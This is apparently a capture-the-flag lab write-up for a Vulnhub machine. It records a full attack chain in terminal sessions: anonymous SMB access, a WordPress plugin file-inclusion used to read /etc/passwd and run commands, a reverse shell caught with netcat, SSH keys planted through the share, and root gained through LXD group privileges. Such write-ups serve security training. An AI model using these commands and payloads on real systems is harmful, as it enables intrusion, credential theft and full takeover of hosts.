
 ========================================== 
|               Enumeration               |
 ========================================== 

* port 22, 80, 139, 445, 10123 are open, see the result of nmap scan "prime.nmap.result.txt" :
	
	*** fired up enum4linux against the box, something interesting came up as the mapped directories can be accessed with no credentials  

	====================================== 
	|    Session Check on 192.168.1.137    |
 	====================================== 
	[+] Server 192.168.1.137 allows sessions using username '', password ''

 	========================================== 
	|    Share Enumeration on 192.168.1.137    |
 	========================================== 

		Sharename       Type      Comment
		---------       ----      -------
		print$          Disk      Printer Drivers
		welcome         Disk      Welcome to Hackerctf LAB
		IPC$            IPC       IPC Service (hackerctflab server (Samba, Ubuntu))
	SMB1 disabled -- no workgroup available

	[+] Attempting to map shares on 192.168.1.137
	//192.168.1.137/print$	Mapping: DENIED, Listing: N/A
	//192.168.1.137/welcome	Mapping: OK, Listing: OK
	//192.168.1.137/IPC$	[E] Can't understand response:
	NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

	this proves my statement.

	root@black-sh:~/Vulnhub/prime# smbclient \\\\192.168.1.137\\welcome 
	Enter WORKGROUP\root's password: 
	Try "help" to get a list of possible commands.
	smb: \> ls
	  .                                   D        0  Thu May 13 02:00:09 2021
	  ..                                  D        0  Fri May  7 14:38:58 2021
	  .mysql_history                      H       18  Sat May  8 03:05:03 2021
	  .profile                            H      807  Fri Mar 19 12:02:58 2021
	  upload                              D        0  Sun May  9 07:19:02 2021
	  .sudo_as_admin_successful           H        0  Sat May  8 01:34:48 2021
	  .bash_logout                        H      220  Fri Mar 19 12:02:58 2021
	  .cache                             DH        0  Fri May  7 14:39:15 2021
	  something                           N       82  Fri May  7 12:18:09 2021
	  secrets                             N        0  Fri May  7 12:15:17 2021
	  .bash_history                       H       72  Sun May  9 07:23:26 2021
	  .bashrc                             H     3771  Fri Mar 19 12:02:58 2021

			19475088 blocks of size 1024. 6505372 blocks available
	smb: \> 

	*** going to port 80, two intersting directories stood out after the gobuster crawiling (see prime.gobuster.result.txt) :
		- /wp hosts a wordpress app which will be scanned after.
		- /server a rabbit hole hosting some wordpress pluging
	*** port 10123 running by pyton3 web server, lists the content of directory as it shown here:
		root@black-sh:~/Vulnhub/prime# curl http://192.168.1.137:10123/
		<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
		<html>
		<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<title>Directory listing for /</title>
		</head>
		<body>
		<h1>Directory listing for /</h1>
		<hr>
		<ul>
		<li><a href=".bash_history">.bash_history</a></li>
		<li><a href=".bash_logout">.bash_logout</a></li>
		<li><a href=".bashrc">.bashrc</a></li>
		<li><a href=".cache/">.cache/</a></li>
		<li><a href=".mysql_history">.mysql_history</a></li>
		<li><a href=".profile">.profile</a></li>
		<li><a href=".sudo_as_admin_successful">.sudo_as_admin_successful</a></li>
		<li><a href="secrets">secrets</a></li>
		<li><a href="something">something</a></li>
		<li><a href="upload/">upload/</a></li>
		</ul>
		<hr>
		</body>
		</html>
	
	it stood out after downloading the files, that the directory belongs to jarvis user. the upload cointains some reverse shell (shell.php).
	
	*** going back to wp/, the wp scan (see sprime.wpscan.result.txt) showed that the app use an up to date gracemedia-media-player plugin
	At this point  i couldn't find aby intersting entry point to box so i digged dipper on the wpscan result and found this: https://www.exploit-db.com/exploits/46537

	so I run this:	
	root@black-sh:~/Vulnhub/prime# curl "192.168.1.137/wp/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd"
	root:x:0:0:root:/root:/bin/bash
	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
	bin:x:2:2:bin:/bin:/usr/sbin/nologin
	sys:x:3:3:sys:/dev:/usr/sbin/nologin
	sync:x:4:65534:sync:/bin:/bin/sync
	games:x:5:60:games:/usr/games:/usr/sbin/nologin
	man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
	lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
	mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
	news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
	uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
	proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
	backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
	list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
	irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
	gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
	nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
	systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
	systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
	systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
	messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
	syslog:x:104:110::/home/syslog:/usr/sbin/nologin
	_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
	tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
	uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
	tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
	landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
	pollinate:x:110:1::/var/cache/pollinate:/bin/false
	usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
	sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
	systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
	jarves:x:1000:1000:jarves:/home/jarves:/bin/bash
	lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
	mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false


 ========================================== 
|               Exploitation              |
 ========================================== 

* The best way too get a reverse a shell from the detected LFI is by poisning the access or ssh log file since their services are open. Consequently, /var/log/apache2/access.log and /var/log/auth.log are not accessible.
At this point I was a remembered that the shell.php found 

root@black-sh:~/Vulnhub/prime# curl "http://192.168.1.137/wp/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=/home/jarves/upload/shell.php&cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)

root@black-sh:~/Vulnhub/prime# curl "http://192.168.1.137/wp/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=/home/jarves/upload/shell.php&cmd=nc%20-h"
root@black-sh:~/Vulnhub/prime# curl "http://192.168.1.137/wp/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=/home/jarves/upload/shell.php&cmd=wget%20-h"
GNU Wget 1.21, a non-interactive network retriever.
Usage: wget [OPTION]... [URL]...

Mandatory arguments to long options are mandatory for short options too.

Startup:
  -V,  --version                   display the version of Wget and exit
  -h,  --help                      print this help
  -b,  --background                go to background after startup
  -e,  --execute=COMMAND           execute a `.wgetrc'-style command

Logging and input file:
  -o,  --output-file=FILE          log messages to FILE
  -a,  --append-output=FILE        append messages to FILE
  -d,  --debug                     print lots of debugging information
  -q,  --quiet                     quiet (no output)
  -v,  --verbose                   be verbose (this is the default)
  -nv, --no-verbose                turn off verboseness, without being quiet
       --report-speed=TYPE         output bandwidth as TYPE.  TYPE can be bits
  -i,  --input-file=FILE           download URLs found in local or external FILE
  -F,  --force-html                treat input file as HTML
  -B,  --base=URL                  resolves HTML input-file links (-i -F)
                                     relative to URL

at this point, I uploaded a reversh shell at /tmp and execute it


root@black-sh:~/Vulnhub/prime# curl "http://192.168.1.137/wp/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=/home/jarves/upload/shell.php&cmd=php%20/tmp/shell.php"

root@black-sh:~/Vulnhub/prime# nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.1.128] from (UNKNOWN) [192.168.1.137] 46992
Linux hackerctflab 5.11.0-16-generic #17-Ubuntu SMP Wed Apr 14 20:12:43 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 07:38:50 up  5:46,  0 users,  load average: 0.09, 0.26, 0.32
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 


 ========================================== 
|             Post-Exploitation           |
 ========================================== 
* Nothing interesting stood out from linpeas scan and pspy64s, no gcc installed to execute a local privelege attack, no .ssh to overcome which got me thing about creating a ssh key

rwsr-xr-x 1 root root            109K Mar 26 17:14 /snap/snapd/11588/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root            124K Mar 30 08:29 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root            109K Apr 24 12:05 /snap/snapd/11841/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)

from the share enumuration found previous, we can create .ssh directory and put ssh keys

root@black-sh:~/Vulnhub/prime/ssh# ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/Vulnhub/prime/ssh/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/Vulnhub/prime/ssh/id_rsa
Your public key has been saved in /root/Vulnhub/prime/ssh/id_rsa.pub
The key fingerprint is:
SHA256:LN76E/+Y2kSUDcWA5kTE+1164uCniqFdcKg/OuoheDw root@black-sh
The key's randomart image is:
+---[RSA 3072]----+
|       +o.o+.    |
|        =  +.    |
|       + .o .    |
|       oo.    .  |
|      + S... o   |
|..   o =..o + .  |
|o E . o o+.o o   |
| o o.+.=.oooo    |
| .o.oo=o++=+.    |
+----[SHA256]-----+


root@black-sh:~/Vulnhub/prime/ssh# smbclient \\\\192.168.1.137\\welcome 
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> mkdir .ssh
NT_STATUS_OBJECT_NAME_COLLISION making remote directory \.ssh
smb: \> cd ..sh
cd \..sh\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \> cd .ssh
smb: \.ssh\> put id_rsa
putting file id_rsa as \.ssh\id_rsa (635.2 kb/s) (average 635.3 kb/s)
smb: \.ssh\> put authorized_keys 
putting file authorized_keys as \.ssh\authorized_keys (138.4 kb/s) (average 386.8 kb/s)
smb: \.ssh\> put id_rsa
putting file id_rsa as \.ssh\id_rsa (508.2 kb/s) (average 433.5 kb/s)
smb: \.ssh\> 

root@black-sh:~/Vulnhub/prime/ssh# ssh -i id_rsa jarves@192.168.1.137 
Welcome to Ubuntu 21.04 (GNU/Linux 5.11.0-16-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu May 13 08:29:40 AM UTC 2021

  System load: 0.4                Memory usage: 59%   Processes:       257
  Usage of /:  61.6% of 18.57GB   Swap usage:   9%    Users logged in: 0

  => There are 3 zombie processes.
  => There were exceptions while processing one or more plugins. See
     /var/log/landscape/sysinfo.log for more information.

 * Pure upstream Kubernetes 1.21, smallest, simplest cluster ops!

     https://microk8s.io/

9 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Sun May  9 11:14:10 2021
jarves@hackerctflab:~$ 


jarves@hackerctflab:~$ python3 dirty_sockv1.py -u jarvis -k .ssh/id_rsa

      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
      |  \ | |__/  |   \_/      [__  |  | |    |_/  
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
                       (version 1)

//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//


[+] Slipped dirty sock on random socket file: /tmp/xtkcsydukd;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Sending payload...
[!] System may not be vulnerable, here is the API reply:


HTTP/1.1 401 Unauthorized
Content-Type: application/json
Date: Thu, 13 May 2021 08:33:46 GMT
Content-Length: 119

{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}


jarves belongs to lxd group which means he can use the LXD API to mount the host’s root filesystem into a container. 

To perforrm this, I followed this articles https://www.hackingarticles.in/lxd-privilege-escalation/

jarves@hackerctflab:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| myimage | 1ddef610d4b7 | no     | alpine v3.13 (20210513_04:59) | x86_64       | CONTAINER | 3.10MB | May 13, 2021 at 9:03am (UTC) |
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
jarves@hackerctflab:/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite
Error: No storage pool found. Please create a new storage pool
jarves@hackerctflab:/tmp$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 
Do you want to configure a new storage pool? (yes/no) [default=yes]: yes
Name of the new storage pool [default=default]: 
Name of the storage backend to use (btrfs, dir, lvm, ceph) [default=btrfs]: 
Create a new BTRFS pool? (yes/no) [default=yes]: 
Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]: 
Size in GB of the new loop device (1GB minimum) [default=5GB]: 
Would you like to connect to a MAAS server? (yes/no) [default=no]: 
Would you like to create a new local network bridge? (yes/no) [default=yes]: 
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
Would you like the LXD server to be available over the network? (yes/no) [default=no]: 
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
jarves@hackerctflab:/tmp$ lxc init myimage -c security.privileged=true
Creating the instance
Instance name is: generous-goblin          
jarves@hackerctflab:/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite
jarves@hackerctflab:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
jarves@hackerctflab:/tmp$ lxc start ignite
jarves@hackerctflab:/tmp$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # cd /m
media/  mnt/
~ # cd /mnt/root/
/mnt/root # ls
bin         cdrom       etc         lib         lib64       lost+found  mnt         proc        run         snap        swap.img    tmp         var
boot        dev         home        lib32       libx32      media       opt         root        sbin        srv         sys         usr
/mnt/root # cd root/
/mnt/root/root # ls
auto.py   data.zip  service   shell     shell32   snap      wp.sql
/mnt/root/root # id
uid=0(root) gid=0(root)
/mnt/root/root # ls -l
total 317748
-rw-r--r--    1 root     root           591 May  6 12:01 auto.py
-rw-r--r--    1 root     root     325297543 May  8 05:49 data.zip
-rwxr-xr-x    1 root     root            45 May  8 06:48 service
-rwxr-xr-x    1 root     root            36 May  5 18:12 shell
-rwxr-xr-x    1 root     root            62 May  8 05:37 shell32
drwxr-xr-x    3 root     root          4096 May  7 18:38 snap
-rw-r--r--    1 root     root         52282 May  8 05:46 wp.sql
/mnt/root/root # cat ../etc/host
host.conf    hostname     hosts        hosts.allow  hosts.deny
/mnt/root/root # cat ../etc/host
host.conf    hostname     hosts        hosts.allow  hosts.deny
/mnt/root/root # cat ../etc/hostname 
hackerctf_lab
/mnt/root/root # cat ../etc/hostname;id;date
hackerctf_lab
uid=0(root) gid=0(root)
Thu May 13 09:11:31 UTC 2021
/mnt/root/root # 


